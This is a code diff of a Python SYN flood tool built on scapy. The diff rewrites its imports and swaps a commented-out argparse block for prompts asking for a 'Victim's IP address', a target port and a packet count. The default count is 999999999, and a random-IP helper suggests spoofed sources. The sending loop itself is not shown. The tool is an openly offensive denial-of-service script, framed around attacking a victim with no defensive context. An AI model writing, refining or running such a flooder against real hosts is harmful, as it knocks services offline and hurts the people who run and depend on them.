@@ -1,6 +1,6 @@
-import argparse
 import random
-from scapy.all import send, IP, TCP
+from scapy.layers.inet import IP, TCP
+from scapy.sendrecv import send
 
 
 DEFAULT_PACK = 999999999
@@ -13,13 +13,6 @@ def random_ip():
 
 
 def get_args():
-    """
-    parser = argparse.ArgumentParser(description="Syn Flooder\n")
-    parser.add_argument('t', help="Victim's IP address")
-    parser.add_argument('a', type=int, help="Amount of packets (default are infinity)", default=DEFAULT_PACK)
-    parser.add_argument('p', type=int, help="Target port (default port is 80)", default=80)
-    args = parser.parse_args()
-    """
     Target_ip = input("Enter Victim's IP address: ")
     dPort = int(input("Enter target port: "))
     packets_to_send = int(input("Enter amount of packets: "))
